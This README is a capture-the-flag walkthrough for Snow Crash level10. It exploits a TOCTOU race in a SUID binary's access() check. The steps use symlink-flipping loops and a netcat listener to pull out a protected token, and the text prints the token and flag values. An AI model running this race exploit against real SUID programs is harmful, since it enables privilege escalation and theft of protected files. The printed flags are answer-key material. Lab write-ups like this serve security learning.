# README.md

```markdown
# Snow Crash - Level10 Walkthrough

## 🔐 Level Description

When connecting to level10, we have:

```bash
level10@SnowCrash:~$ ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
```

- `level10`: A SUID binary.
- `token`: A file owned by `flag10` with no read permissions for `level10`.

---

## 📦 Binary Behavior Analysis

Using `ltrace` and `strings`, we find the binary:

- Takes two arguments: **file** and **host**.
- Tries to connect to **port 6969** on the given host.
- Uses `access()` to check file permissions before sending.

Example output:

```bash
level10@SnowCrash:~$ ltrace ./level10
Connecting to %s:6969 ..
Unable to connect to host %s
Unable to write banner to host %s
Connected!
```

This exposes a **TOCTOU (Time-Of-Check-To-Time-Of-Use)** vulnerability using `access()`.

---

## 🧠 Exploitation Strategy

We can exploit the race condition by:

1. Setting up a **listener** on port `6969` (using `nc`).
2. **Rapidly swapping** symbolic links between a dummy file and the `token`.
3. Repeatedly executing the vulnerable binary to catch the right timing.

---

## ⚙️ Step-by-Step Exploitation

### 1. Open a second SSH session

```bash
ssh level10@[IP_SNOW_CRASH] -p 4242
```

### 2. In the second session, start a Netcat listener:

```bash
level10@SnowCrash:~$ nc -lk 6969
```

### 3. In the first session, start an infinite symlink switch loop:

```bash
level10@SnowCrash:~$ while true; do ln -sf /tmp/test /tmp/race; ln -sf ~/token /tmp/race; done &
```

- This script constantly swaps `/tmp/race` between `/tmp/test` and the `~/token`.

### 4. In the first session, run the vulnerable binary in a loop:

```bash
level10@SnowCrash:~$ while true; do ./level10 /tmp/race [IP_SNOW_CRASH]; done
```

### 5. Wait for the token to appear in the Netcat listener:

```bash
level10@SnowCrash:~$ nc -lk 6969
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
```

---

## 🏁 Final Step

Use the token to switch to `flag10`:

```bash
level10@SnowCrash:~$ su flag10
Password: [TOKEN]
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```

---

## 🧩 Summary

- Found a TOCTOU vulnerability via `access()`.
- Used symbolic link flipping to race and trick the binary.
- Used Netcat to capture the token.
- Learned how to automate race condition exploits.
